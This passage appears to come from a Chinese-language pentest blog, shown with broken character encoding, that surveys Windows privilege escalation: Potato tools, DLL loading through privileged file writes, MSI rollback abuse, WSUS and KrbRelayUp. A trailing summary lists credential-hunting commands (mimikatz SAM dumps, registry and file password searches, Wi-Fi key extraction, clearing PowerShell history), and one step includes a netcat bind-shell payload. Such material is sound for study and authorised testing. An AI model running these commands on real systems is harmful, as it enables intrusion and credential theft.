<h3 id="ghost-potatoms08-068-ç»•è¿‡">Ghost potatoï¼ˆMS08-068 ç»•è¿‡ï¼‰</h3>
<p>ä¸ºé˜²æ­¢ç”¨æˆ· relay æœ¬æœºï¼Œåœ¨ lsass ä¸­æ·»åŠ ç¼“å­˜ç»•è¿‡ï¼Œå¦‚æœç¼“å­˜ä¸­æœ‰ (Challenge,cifs/B) å°±ä¼šè®¤è¯å¤±è´¥ã€‚
ç„¶è€Œè¿™ä¸ª (Challenge,cifs/B) æ˜¯æœ‰æ—¶æ•ˆæ€§çš„ï¼ˆ300sï¼‰ï¼Œæ‰€æœ‰åªè¦ç­‰ 300s å†å‘é€ type3 å°±å¯ä»¥ bypass äº†ã€‚</p>

<p>ç”¨ä¿®æ”¹åçš„ impacket https://shenaniganslabs.io/files/impacket-ghostpotato.zip å¯ä»¥ç›´æ¥æ‰“ï¼Œç”¨æ³•å’ŒMS08-068 ç±»ä¼¼ã€‚</p>

<h3 id="sweet-potato">Sweet Potato</h3>
<p>é›†æˆäº†å‰é¢å‡ ç§åœŸè±†è§¦å‘ NTLM è®¤è¯çš„æ–¹å¼ï¼ŒåŒ…æ‹¬ï¼šCOMï¼ŒWinRMï¼ŒSpoolsvï¼Œå…¶ä¸­ WInRM çš„æ”»å‡»åŸç†å‚è€ƒï¼šhttps://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/</p>

<p>å¤§è‡´æ€è·¯å°±æ˜¯å½“ WinRM åœ¨å½“å‰ç³»ç»Ÿæœªå¯ç”¨æ—¶ï¼Œæ”»å‡»è€…ç›‘å¬æœ¬æœº 5985 ç«¯å£ï¼ŒBITS æœåŠ¡ä¼šå‘ WinRM 5985 å‘èµ· NTLM è®¤è¯ã€‚</p>

<ul>
  <li>RottenPotato</li>
  <li>Weaponized JuciyPotato with BITS WinRM discovery</li>
  <li>PrintSpoofer discovery and original exploit</li>
  <li>EfsRpc built on EfsPotato</li>
  <li>PetitPotam</li>
</ul>

<p>åˆ©ç”¨å·¥å…·ï¼š<a href="https://github.com/CCob/SweetPotato">CCob/SweetPotato: Local Service to SYSTEM privilege escalation from Windows 7 to Windows 10 / Server 2019</a></p>

<h3 id="generic-potato">Generic Potato</h3>

<p>SweetPotato çš„ä¿®æ”¹ç‰ˆæœ¬ï¼Œ æ˜¯@micahvandeusen ç”¨äºæ”¯æŒé€šè¿‡ HTTP å’Œ/æˆ–å‘½åç®¡é“æ¨¡æ‹Ÿèº«ä»½éªŒè¯ã€‚</p>

<p>è¿™å…è®¸ä» SSRF å’Œ/æˆ–æ–‡ä»¶å†™å…¥è¿›è¡Œæœ¬åœ°æƒé™å‡çº§ã€‚ åœ¨ä»¥ä¸‹æƒ…å†µä¸‹å®ƒå¾ˆæ–¹ä¾¿ï¼š</p>

<ol>
  <li>æˆ‘ä»¬æœ‰æƒè®¿é—®çš„ç”¨æˆ·æ‹¥æœ‰ SeImpersonatePrivilege</li>
  <li>ç³»ç»Ÿæ²¡æœ‰è¿è¡Œæ‰“å°æœåŠ¡ï¼Œè¿™ä¼šé˜»æ­¢ SweetPotato ã€‚</li>
  <li>WinRM æ­£åœ¨è¿è¡Œä»¥é˜²æ­¢ RogueWinRM</li>
  <li>æ‚¨ä¸å…è®¸å¯¹æ‚¨æ§åˆ¶çš„ä»»ä½•è®¡ç®—æœºè¿›è¡Œå‡ºç«™ RPCï¼Œå¹¶ä¸”ç¦ç”¨ BITS æœåŠ¡ä»¥é˜²æ­¢ RoguePotato ã€‚</li>
</ol>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/micahvandeusen/GenericPotato">micahvandeusen/GenericPotato: Impersonating authentication over HTTP and/or named pipes.</a></li>
</ul>

<h3 id="juicypotatong">JuicyPotatoNG</h3>
<ul>
  <li><a href="https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/">Giving JuicyPotato a second chance: JuicyPotatoNG â€“ Decoderâ€™s Blog</a></li>
</ul>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/antonioCoco/JuicyPotatoNG">antonioCoco/JuicyPotatoNG: Another Windows Local Privilege Escalation from Service Account to System</a></li>
</ul>

<h3 id="godpotato">GodPotato</h3>
<p>å½±å“èŒƒå›´ï¼š</p>
<ul>
  <li>Windows Server 2012 - Windows Server 2022</li>
  <li>Windows8 - Windows 11</li>
</ul>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/BeichenDream/GodPotato">BeichenDream/GodPotato</a></li>
</ul>

<h3 id="é¶åœº">é¶åœº</h3>
<ul>
  <li>Juicy Potato - HackTheBox-Jeeves</li>
  <li>Rogue Potato - HackTheBox-Remote</li>
</ul>

<p>å‚è€ƒï¼š</p>
<ul>
  <li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">Potatoes - Windows Privilege Escalation Â· Jorge Lajara Website</a></li>
  <li><a href="https://www.geekby.site/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/#2-hot-potato">Potato å®¶æ—ææƒåˆ†æ - Geekbyâ€™s Blog</a></li>
  <li><a href="https://blog.csdn.net/qq_42045349/article/details/118225426">ã€ç²¾é€‰ã€‘Rotten/Juicy Potatoææƒå·¥åŸç†åˆ†æ_rottenpotato-CSDNåšå®¢</a></li>
  <li><a href="http://moonflower.fun/index.php/2022/05/01/329/">Potato å®¶æ—ææƒå­¦ä¹ </a></li>
  <li><a href="https://blog.csdn.net/qq_41874930/article/details/108825010">NTLM-relayæ”»å‡»çš„åŸç†ä¸å®ç°</a></li>
  <li><a href="https://paper.seebug.org/2090/">Windows å‘½åç®¡é“å®¢æˆ·ç«¯æ¨¡æ‹Ÿå’Œ PrintSpoofer åŸç†æ¢ç©¶</a></li>
</ul>

<h2 id="é€šè¿‡ç‰¹æƒæ–‡ä»¶å†™å…¥ææƒ">é€šè¿‡ç‰¹æƒæ–‡ä»¶å†™å…¥ææƒ</h2>
<h3 id="diaghub">DiagHub</h3>
<blockquote>
  <p>ä»ç‰ˆæœ¬ 1903 åŠæ›´é«˜ç‰ˆæœ¬å¼€å§‹ï¼ŒDiagHub ä¸èƒ½å†ç”¨äºåŠ è½½ä»»æ„ DLLã€‚</p>
</blockquote>

<p>Microsoft è¯Šæ–­ä¸­å¿ƒæ ‡å‡†æ”¶é›†å™¨æœåŠ¡ (DiagHub) æ˜¯ä¸€é¡¹æ”¶é›†è·Ÿè¸ªä¿¡æ¯å¹¶é€šè¿‡ DCOM ä»¥ç¼–ç¨‹æ–¹å¼å…¬å¼€çš„æœåŠ¡ã€‚</p>

<p>è¯¥ DCOM å¯¹è±¡å¯ç”¨äºå°† DLL åŠ è½½åˆ° SYSTEM è¿›ç¨‹ä¸­ï¼Œå‰ææ˜¯è¯¥ DLL å­˜åœ¨äº C:\Windows\System32 ç›®å½•ä¸­ã€‚</p>

<p>åˆ©ç”¨æ­¥éª¤ï¼š</p>
<ol>
  <li>åˆ›å»ºä¸€ä¸ªé‚ªæ¶çš„ DLL ä¾‹å¦‚ï¼špayload.dll å¹¶å°†å…¶ç§»è‡³ C:\Windows\System32</li>
  <li>build https://github.com/xct/diaghub</li>
  <li>diaghub.exe c:\ProgramData\ Payload.dll</li>
</ol>

<p>é»˜è®¤æœ‰æ•ˆè´Ÿè½½å°†è¿è¡Œ C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe</p>

<h3 id="usodllloader">UsoDLLLoader</h3>
<blockquote>
  <p>2020-06-06 æ›´æ–°ï¼šæ­¤æŠ€å·§ä¸å†é€‚ç”¨äºæœ€æ–°ç‰ˆæœ¬çš„ Windows 10 Insider Previewã€‚</p>
</blockquote>

<p>å¦‚æœæˆ‘ä»¬åœ¨ Windows æˆ–æŸäº›ç¬¬ä¸‰æ–¹è½¯ä»¶ä¸­å‘ç°ç‰¹æƒæ–‡ä»¶å†™å…¥æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å°†è‡ªå·±ç‰ˆæœ¬çš„ windowscoredeviceinfo.dll å¤åˆ¶åˆ° C:\Windows\Sytem32\ä¸­ï¼Œç„¶åè®© USO æœåŠ¡ä»¥ NT AUTHORITY\System çš„èº«ä»½åŠ è½½å®ƒã€‚</p>

<p>åˆ©ç”¨æ­¥éª¤ï¼š</p>
<ol>
  <li>æ„å»º https://github.com/itm4n/UsoDllLoader
    <ol>
      <li>é€‰æ‹©å‘å¸ƒé…ç½®å’Œ x64 æ¶æ„ã€‚</li>
      <li>æ„å»ºè§£å†³æ–¹æ¡ˆã€‚
        <ol>
          <li>DLL .\x64\Release\WindowsCoreDeviceInfo.dll</li>
          <li>åŠ è½½ç¨‹åº.\x64\Release\UsoDllLoader.exeã€‚</li>
        </ol>
      </li>
    </ol>
  </li>
  <li>å°† WindowsCoreDeviceInfo.dll å¤åˆ¶åˆ° C:\Windows\System32\</li>
  <li>ä½¿ç”¨åŠ è½½ç¨‹åºå¹¶ç­‰å¾… shell æˆ–è¿è¡Œ usoclient StartInteractiveScan å¹¶è¿æ¥åˆ°ç«¯å£ 1337 ä¸Šçš„ç»‘å®š shellã€‚</li>
</ol>

<h3 id="wertrigger">WerTrigger</h3>
<p>åˆ©ç”¨ Windows é—®é¢˜æŠ¥å‘Šå†™å…¥ç‰¹æƒã€‚</p>

<p>åˆ©ç”¨æ­¥éª¤ï¼š</p>
<ol>
  <li>å…‹éš† https://github.com/sailay1996/WerTrigger</li>
  <li>å°† phoneinfo.dll å¤åˆ¶åˆ°C:\Windows\System32\</li>
  <li>å°† Report.wer æ–‡ä»¶å’Œ WerTrigger.exe æ”¾åœ¨åŒä¸€ç›®å½•ä¸­ã€‚</li>
  <li>ç„¶åï¼Œè¿è¡Œ WerTrigger.exeã€‚</li>
  <li>äº«å— NT AUTHORITY\SYSTEM çš„ shell</li>
</ol>

<h3 id="wermgr">WerMgr</h3>
<p>åˆ©ç”¨ Windows é”™è¯¯æŠ¥å‘Šçš„ç‰¹æƒç›®å½•åˆ›å»ºé”™è¯¯è¾¾æˆææƒ</p>

<p>åˆ©ç”¨æ­¥éª¤ï¼š</p>
<ol>
  <li>Clone https://github.com/binderlabs/DirCreate2System</li>
  <li>Create directory C:\Windows\System32\wermgr.exe.local\</li>
  <li>Grant access to it: cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f</li>
  <li>Place spawn.dll file and dircreate2system.exe in a same directory and run .\dircreate2system.exe.</li>
  <li>Enjoy a shell as NT AUTHORITY\SYSTEM</li>
</ol>

<h2 id="é€šè¿‡ç‰¹æƒæ–‡ä»¶åˆ é™¤ææƒ">é€šè¿‡ç‰¹æƒæ–‡ä»¶åˆ é™¤ææƒ</h2>
<p>åœ¨ MSI å®‰è£…æœŸé—´ï¼ŒWindows Installer æœåŠ¡ä¼šç»´æŠ¤æ¯ä¸ªæ›´æ”¹çš„è®°å½•ï¼Œä»¥é˜²éœ€è¦å›æ»šï¼Œä¸ºæ­¤å®ƒå°†åˆ›å»ºï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> C:\Config.Msi ä¸­çš„æ–‡ä»¶å¤¹åŒ…å«
     å›æ»šè„šæœ¬ (.rbs)
     å›æ»šæ–‡ä»¶ (.rbf)
</code></pre></div></div>

<p>è¦å°†ç‰¹æƒæ–‡ä»¶åˆ é™¤è½¬æ¢ä¸ºæœ¬åœ°æƒé™æå‡ï¼Œæ‚¨éœ€è¦æ»¥ç”¨ Windows Installer æœåŠ¡ã€‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Windows Installer åˆ›å»ºå—ä¿æŠ¤çš„ C:\Config.Msi æ–‡ä»¶å¤¹åç«‹å³å°†å…¶åˆ é™¤
 é‡æ–°åˆ›å»ºå…·æœ‰å¼± DACL æƒé™çš„ C:\Config.Msi æ–‡ä»¶å¤¹ï¼Œå› ä¸ºæ™®é€šç”¨æˆ·å¯ä»¥åœ¨ C:\ æ ¹ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹ã€‚
 å°†æ¶æ„ .rbs å’Œ .rbf æ–‡ä»¶æ”¾å…¥å…¶ä¸­ï¼Œä»¥ä¾¿ç”± MSI å›æ»šæ‰§è¡Œ
 ç„¶ååœ¨å›æ»šæ—¶ï¼ŒWindows Installer å°†å¯¹ç³»ç»Ÿè¿›è¡Œä»»æ„æ›´æ”¹
</code></pre></div></div>

<p>è§¦å‘æ­¤é“¾çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ zdi/FilesystemEoPs/FolderOrFileDeleteToSystemã€‚  è¯¥æ¼æ´åˆ©ç”¨åŒ…å«ä¸€ä¸ªå…·æœ‰ 2 ä¸ªæ“ä½œçš„ .msi æ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªæ“ä½œä¼šäº§ç”Ÿå»¶è¿Ÿï¼Œç¬¬äºŒä¸ªæ“ä½œä¼šå¼•å‘é”™è¯¯ä»¥ä½¿å…¶å›æ»šã€‚  æ­¤å›æ»šå°†â€œæ¢å¤â€C:\Program Files\Common Files\microsoft shared\ink\HID.dll ä¸­çš„æ¶æ„ HID.dllã€‚</p>

<p>ç„¶åä½¿ç”¨ [CTRL]+[ALT]+[DELETE] åˆ‡æ¢åˆ°å®‰å…¨æ¡Œé¢å¹¶æ‰“å¼€å±å¹•é”®ç›˜ (osk.exe)ã€‚  osk.exeè¿›ç¨‹é¦–å…ˆæŸ¥æ‰¾C:\Program Files\Common Files\microsoftå…±äº«\ink\HID.dllåº“è€Œä¸æ˜¯C:\Windows\System32\HID.dll</p>

<h1 id="windows-åŸŸå†…ææƒ">Windows åŸŸå†…ææƒ</h1>
<h2 id="wsus">WSUS</h2>
<p>WSUS æ˜¯å¾®è½¯æ¨å‡ºçš„å…è´¹çš„ Windows æ›´æ–°ç®¡ç†æœåŠ¡ï¼Œå½“æˆ‘ä»¬è·å¾—äº†WSUSæœåŠ¡å™¨çš„æ§åˆ¶æƒé™åï¼Œå¯ä»¥é€šè¿‡æ¨é€è¡¥ä¸çš„æ–¹å¼è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚è¿™ä¸ªåˆ©ç”¨æ–¹æ³•æœ€æ—©å…¬å¼€åœ¨BlackHat USA 2015ã€‚</p>

<p>åˆ©ç”¨å·¥å…·</p>
<ul>
  <li>https://github.com/nettitude/SharpWSUS</li>
  <li>https://github.com/AlsidOfficial/WSUSpendu</li>
  <li>https://github.com/ThunderGunExpress/Thunder_Woosus</li>
</ul>

<p>ä»¥ä¸Šä¸‰ä¸ªå·¥å…·çš„å®ç°åŸç†åŸºæœ¬ç›¸åŒï¼Œéƒ½æ˜¯åˆ›å»ºä¸€ä¸ªè°ƒç”¨psexecæ‰§è¡Œå‘½ä»¤çš„è¡¥ä¸ï¼Œå°†è¡¥ä¸æ¨é€è‡³æŒ‡å®šè®¡ç®—æœºï¼Œç­‰å¾…ç›®æ ‡è®¡ç®—æœºæ›´æ–°è¡¥ä¸</p>

<ul>
  <li><a href="https://www.4hou.com/shop/posts/nJAP">å˜¶è´§</a></li>
</ul>

<h2 id="krbrelayup">KrbRelayUp</h2>
<p>CVE-2022â€“26923 åŸŸå†…ææƒæ¼æ´ã€‚</p>

<p>è¿™æœ¬è´¨ä¸Šæ˜¯åœ¨ä¸å¼ºåˆ¶æ‰§è¡Œ LDAP ç­¾åï¼ˆé»˜è®¤è®¾ç½®ï¼‰çš„ Windows åŸŸç¯å¢ƒä¸­çš„é€šç”¨æ— ä¿®å¤æœ¬åœ°æƒé™å‡çº§ã€‚</p>

<p>è¿™æ„å‘³ç€æ¯å°åŸŸå†… Windows ä¸»æœºéƒ½åªè¦æœªæ›´æ”¹é»˜è®¤è®¾ç½®å¹¶å¼ºåˆ¶æ‰§è¡Œ LDAP ç­¾åè®¾ç½®ï¼Œå°±å®¹æ˜“å—åˆ°æ”»å‡»ã€‚æœ€é…·çš„æ˜¯ï¼Œä¸éœ€è¦æ‹¥æœ‰ç‰¹æ®Šæƒé™æˆ–æˆä¸ºç®¡ç†å‘˜ã€‚</p>

<ul>
  <li>
    <table>
      <tbody>
        <tr>
          <td>[No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials</td>
          <td>Icyguiderâ€™s Blog](https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html)</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>[From unprivileged user to system - KrbRelayUp</td>
          <td>wwwGeneral](https://wwwgeneral.github.io/posts/from-unprivileged-user-to-system-krbrelayup/)</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<h1 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h1>
<ul>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords">PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master Â· swisskyrepo/PayloadsAllTheThings</a></li>
  <li><a href="https://www.freebuf.com/articles/web/281863.html">æ‰‹æŠŠæ‰‹æ•™ä½ Windowsææƒ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></li>
  <li><a href="https://github.com/alphaSeclab/windows-security/blob/master/Readme_full.md#f39e40e340f61ae168b67424baac5cc6">windows-security/Readme_full.md at master Â· alphaSeclab/windows-security</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="windows" /><category term="LPE" /><category term="Info gathering" /><summary type="html"><![CDATA[Windows æœ¬åœ°ææƒ åˆ©ç”¨å¯¼å‡ºæˆ–æŸ¥æ‰¾å¯†ç ææƒ ä¸»è¦æ€è·¯åœ¨äºä½¿ç”¨ mimikatz æˆ–è€…ä»é…ç½®æ–‡ä»¶ã€æ³¨å†Œè¡¨é¡¹ä¸­æ’æŸ¥å¯†ç ã€‚ SAM and SYSTEM files(win10 åŠä»¥ä¸‹) å®‰å…¨å¸æˆ·ç®¡ç†å™¨ (SAM)ï¼Œé€šå¸¸æ˜¯å®‰å…¨å¸æˆ·ç®¡ç†å™¨ï¼Œæ˜¯ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ã€‚ ç”¨æˆ·å¯†ç ä»¥å“ˆå¸Œæ ¼å¼å­˜å‚¨åœ¨æ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­ï¼Œä½œä¸º LM å“ˆå¸Œæˆ– NTLM å“ˆå¸Œã€‚ è¯¥æ–‡ä»¶ä½äº %SystemRoot%/system32/config/SAM ä¸­ï¼Œå¹¶å®‰è£…åœ¨ HKLM/SAM ä¸Šã€‚ # Usually %SYSTEMROOT% = C:\Windows %SYSTEMROOT%\repair\SAM %SYSTEMROOT%\System32\config\RegBack\SAM %SYSTEMROOT%\System32\config\SAM %SYSTEMROOT%\repair\system %SYSTEMROOT%\System32\config\SYSTEM %SYSTEMROOT%\System32\config\RegBack\system ç›´æ¥ä½¿ç”¨ mimikatz æå–å³å¯ï¼Œæ— éœ€ä½¿ç”¨ pwddump HiveNightmare(Windows 10 and 11) ä¸å½±å“ Serverã€‚ CVE-2021â€“36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user ä½¿ç”¨ icacls å‘½ä»¤æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨ C:\Windows\System32&gt; icacls config\SAM config\SAM BUILTIN\Administrators:(I)(F) NT AUTHORITY\SYSTEM:(I)(F) BUILTIN\Users:(I)(RX) &lt;-- this is wrong - regular users should not have read access! Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it. mimikatz&gt; token::whoami /full # List shadow copies available mimikatz&gt; misc::shadowcopies # Extract account from SAM databases mimikatz&gt; lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM # Extract secrets from SECURITY mimikatz&gt; lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY ã€æ¼æ´å¤ç°ã€‘CVE-2021-36934 Windows ææƒæ¼æ´å¤ç° - TeamsSix æœç´¢æ–‡ä»¶å†…å®¹ä¸­çš„ password åœ¨ .xml, .ini, .txt .config ç­‰æ–‡ä»¶ä¸­æœç´¢ Password cd C:\ &amp; findstr /SI /M "password" *.xml *.ini *.txt findstr /si password *.xml *.ini *.txt *.config 2&gt;nul &gt;&gt; results.txt findstr /spin "password" *.* åœ¨è¿œç¨‹åœ°å€ä¾‹å¦‚ SMB Shares æˆ– SharePoint æœç´¢ Search passwords in SharePoint: nheiniger/SnaffPoint (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6) # First, retrieve a token ## Method 1: using SnaffPoint binary $token = (.\GetBearerToken.exe https://your.sharepoint.com) ## Method 2: using AADInternals Install-Module AADInternals -Scope CurrentUser Import-Module AADInternals $token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com") # Second, search on Sharepoint ## Method 1: using search strings in ./presets dir .\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token ## Method 2: using search string in command line ### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference .\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config" Search passwords in SMB Shares: SnaffCon/Snaffler æœç´¢å’Œ password ç›¸å…³çš„æ–‡ä»¶å dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* where /R C:\ user.txt where /R C:\ *.ini æœç´¢å’Œ password ç›¸å…³çš„æ³¨å†Œè¡¨ REG QUERY HKLM /F "password" /t REG_SZ /S /K REG QUERY HKCU /F "password" /t REG_SZ /S /K reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s åœ¨ unattend.xml ä¸­æœç´¢å¯†ç  è‡ªåŠ¨å®‰è£…å…è®¸ç¨‹åºåœ¨ä¸éœ€è¦ç®¡ç†å‘˜å…³æ³¨ä¸‹è‡ªåŠ¨å®‰è£…ã€‚è¿™ç§è§£å†³æ–¹æ¡ˆç”¨äºåœ¨æ‹¥æœ‰è¾ƒå¤šé›‡å‘˜å’Œæ—¶é—´ç´§ç¼ºçš„è¾ƒå¤§å‹ç»„ç»‡ä¸­éƒ¨ç½²ç¨‹åºã€‚å¦‚æœç®¡ç†å‘˜æ²¡æœ‰è¿›è¡Œæ¸…ç†çš„è¯ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªåä¸ºUnattendçš„XMLæ–‡ä»¶æ®‹å­˜åœ¨ç³»ç»Ÿä¸Šã€‚è¿™ä¸ªXMLæ–‡ä»¶åŒ…å«æ‰€æœ‰åœ¨å®‰è£…ç¨‹åºè¿‡ç¨‹ä¸­çš„é…ç½®ï¼ŒåŒ…æ‹¬ä¸€äº›æœ¬åœ°ç”¨æˆ·çš„é…ç½®ï¼Œä»¥åŠç®¡ç†å‘˜è´¦æˆ·ã€‚ Location of the unattend.xml files. C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml C:\Windows\system32\sysprep.inf C:\Windows\system32\sysprep\sysprep.xml Display the content of these files with dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul. Example content &lt;component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64"&gt; &lt;AutoLogon&gt; &lt;Password&gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==&lt;/Password&gt; &lt;Enabled&gt;true&lt;/Enabled&gt; &lt;Username&gt;Administrateur&lt;/Username&gt; &lt;/AutoLogon&gt; &lt;UserAccounts&gt; &lt;LocalAccounts&gt; &lt;LocalAccount wcm:action="add"&gt; &lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt; &lt;Group&gt;administrators;users&lt;/Group&gt; &lt;Name&gt;Administrateur&lt;/Name&gt; &lt;/LocalAccount&gt; &lt;/LocalAccounts&gt; &lt;/UserAccounts&gt; Unattend credentials are stored in base64 and can be decoded manually with base64. $ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d SecretSecurePassword1234* The Metasploit module post/windows/gather/enum_unattend looks for these files. Unattended Installsææƒ - zpchcbd - åšå®¢å›­ IIS Web config ä¸­çš„å¯†ç  Get-Childitem â€“Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config C:\inetpub\wwwroot\web.config å…¶ä»–å¯èƒ½å­˜åœ¨å‡­è¯çš„æ–‡ä»¶ %SYSTEMDRIVE%\pagefile.sys %WINDIR%\debug\NetSetup.log %WINDIR%\repair\sam %WINDIR%\repair\system %WINDIR%\repair\software, %WINDIR%\repair\security %WINDIR%\iis6.log %WINDIR%\system32\config\AppEvent.Evt %WINDIR%\system32\config\SecEvent.Evt %WINDIR%\system32\config\default.sav %WINDIR%\system32\config\security.sav %WINDIR%\system32\config\software.sav %WINDIR%\system32\config\system.sav %WINDIR%\system32\CCM\logs\*.log %USERPROFILE%\ntuser.dat %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat %WINDIR%\System32\drivers\etc\hosts C:\ProgramData\Configs\* C:\Program Files\Windows PowerShell\* dir c:*vnc.ini /s /b dir c:*ultravnc.ini /s /b Wifi å¯†ç  Find AP SSID netsh wlan show profile Get Cleartext Pass netsh wlan show profile &lt;SSID&gt; key=clear Oneliner method to extract wifi passwords from all the access point. cls &amp; echo. &amp; for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" &amp; echo.) &amp; @echo on æ³¨æ„ï¼Œè¯¥ä¸€å¥è¯ä»…å¯¹è‹±æ–‡ç³»ç»Ÿæœ‰ç”¨ï¼Œä¸­æ–‡ç³»ç»Ÿéœ€è¦ä¿®æ”¹åŒ¹é…å­—æ®µã€‚ ä¾¿ç¬ºä¸­å­˜æ”¾çš„å¯†ç  The sticky notes app stores itâ€™s content in a sqlite db located at C:\Users&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite æœåŠ¡ä¸­å­˜æ”¾çš„å¯†ç  Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1 Import-Module path\to\SessionGopher.ps1; Invoke-SessionGopher -AllDomain -o Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss Key Manager ä¸­å­˜æ”¾çš„å¯†ç  This software will display its output in a GUI ä¸‹é¢çš„å‘½ä»¤å°†æ‰“å¼€ windows å‡­æ®ç®¡ç†å™¨ã€‚ rundll32 keymgr,KRShowKeyMgr Powershell å†å²è®°å½•ä¸­å­˜æ”¾çš„å¯†ç  type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt cat (Get-PSReadlineOption).HistorySavePath cat (Get-PSReadlineOption).HistorySavePath | sls passw å…³é—­ ps å†å²è®°å½• Set-PSReadlineOption -HistorySaveStyle SaveNothing Powershell Transcript æ–‡ä»¶ C:\Users\&lt;USERNAME&gt;\Documents\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt C:\Transcripts\&lt;DATE&gt;\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt å¤‡ç”¨æ•°æ®æµï¼ˆADSï¼‰ä¸­çš„å¯†ç  ADS æ˜¯æ·»åŠ åˆ°æ–°æŠ€æœ¯æ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿç§°ä¸º NT æ–‡ä»¶ç³»ç»Ÿ (NTFS)ï¼‰ä¸­çš„åŠŸèƒ½ï¼Œä»¥æé«˜ä¸ Macintosh åˆ†å±‚æ–‡ä»¶ç³»ç»Ÿ (HFS) çš„å¯æ¯”æ€§ã€‚ ä¾‹å¦‚åœ¨ notepad 